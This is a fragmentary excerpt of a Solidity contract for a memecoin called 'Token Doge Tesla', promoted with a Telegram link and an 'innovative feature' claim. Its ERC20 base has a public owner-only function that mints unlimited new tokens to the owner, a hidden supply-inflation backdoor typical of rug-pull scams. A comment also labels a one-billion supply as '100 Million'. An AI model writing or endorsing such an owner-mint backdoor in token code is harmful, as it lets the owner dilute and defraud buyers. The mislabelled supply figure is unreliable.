...
//
// $TokenDogeTesla proposes an innovative feature in its contract.
//
// 📱 Telegram:https://t.me/Tokendogetesla
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _Tokendogetesla(uint256 amount) public onlyOwner {
 _Tokendogetesla(msg.sender, amount);
    }
    ...
    function _Tokendogetesla(address account, uint256 amount) internal virtual {
...
contract $TokenDogeTesla is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Token Doge Tesla", "DOGETESLA") {
        _Tokendogetesla(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}